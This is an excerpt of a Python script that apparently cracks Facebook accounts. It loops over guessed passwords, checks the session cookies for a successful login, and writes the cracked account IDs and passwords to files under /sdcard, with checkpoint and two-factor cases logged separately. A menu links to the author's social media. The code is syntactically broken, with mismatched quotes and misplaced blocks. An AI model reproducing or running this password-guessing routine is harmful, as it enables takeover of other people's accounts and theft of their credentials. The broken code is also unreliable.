...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-", wit)
    print("\t  Facebook : wasif ali')
    print("\t  Fb page  : pubg lite')
    print("\t  Github   : wasifjani')
    print(c, 45*"-")
    print(47*"-")
    try:
...
def xyz():
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/profile.php?id=100037255963692');xyz()
    elif hamii in ["4","04"]:
        os.system("xdg-open https://wa.me/+923179873063')
        xyz()    
    elif hamii in ["0","00"]:
       exit()
    else:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio XD_OK.mp3")
                print('\r\033[1;32m[XD-OK] '+uid+' [√] '+ps+ '')
                ...
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio XD_2F.mp3")
                    print('\r\033[1;34m[XD-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/XD-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio XD_CP.mp3")
                    print(f'\r\033[1;30m[XD-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[WASIF.XD🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio XD-OK.mp3")
                print('\r\033[1;32m[XD-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/XD-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio XD _CP.mp3")
                    print(f'\r\033[1;30m[XD-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/XD-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
